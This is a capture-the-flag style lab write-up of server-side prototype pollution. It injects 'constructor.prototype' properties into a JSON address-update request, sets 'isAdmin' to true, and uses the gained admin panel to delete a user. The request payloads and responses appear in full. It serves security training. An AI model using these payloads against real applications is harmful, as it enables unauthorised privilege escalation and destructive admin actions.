# Identification

## Testing `__proto__`

The first prototype pollution payload attempted to directly modify the prototype using `__proto__`.

The following property was added to the JSON body:

```json
"__proto__": {
  "json spaces": 10
}
```

The complete request body became:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "KQEAa8G1EyE0ny3wwO1UrfgK37cSlqiB",
  "__proto__": {
    "json spaces": 10
  }
}
```

The response remained compact and was not affected by the injected `json spaces` property.

This indicated that the direct `__proto__` vector was not effective in this application.

---

## Testing `constructor.prototype`

The payload was then modified to use the alternative prototype pollution path:

```json
"constructor": {
  "prototype": {
    "json spaces": 10
  }
}
```

The complete body was:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "KQEAa8G1EyE0ny3wwO1UrfgK37cSlqiB",
  "constructor": {
    "prototype": {
      "json spaces": 10
    }
  }
}
```

This time, the server response changed significantly:

```json
{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Tarragona",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": false,
          "json spaces": 10
}
```

The increased indentation demonstrated that the injected `json spaces` property was being inherited by objects on the server.

This confirmed a **server-side prototype pollution vulnerability**.

---

# Exploitation

## Identifying the gadget

The server response contained the following property:

```json
"isAdmin": false
```

This suggested that `isAdmin` could potentially be used as a privilege-escalation gadget.

The `constructor.prototype` payload was therefore modified:

```json
"constructor": {
  "prototype": {
    "isAdmin": true
  }
}
```

The resulting request body was:

```json
{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Tarragona",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "KQEAa8G1EyE0ny3wwO1UrfgK37cSlqiB",
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

The server responded with:

```json
{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "Wiener HQ",
          "address_line_2": "One Wiener Way",
          "city": "Tarragona",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

The value of `isAdmin` had changed from:

```text
false
```

to:

```text
true
```

This confirmed that the polluted prototype was influencing the application's authorization logic.

---

# Privilege Escalation

The pollution resulted in the equivalent of:

```javascript
Object.prototype.isAdmin = true;
```

As a consequence, objects that did not explicitly define their own `isAdmin` property could inherit:

```javascript
isAdmin === true
```

The authenticated user therefore gained administrative privileges without modifying the user's actual account record.

After refreshing the account page, an **Admin panel** link became available.

I accessed the administrative interface and deleted the user:

```text
carlos
```

The lab was successfully solved.

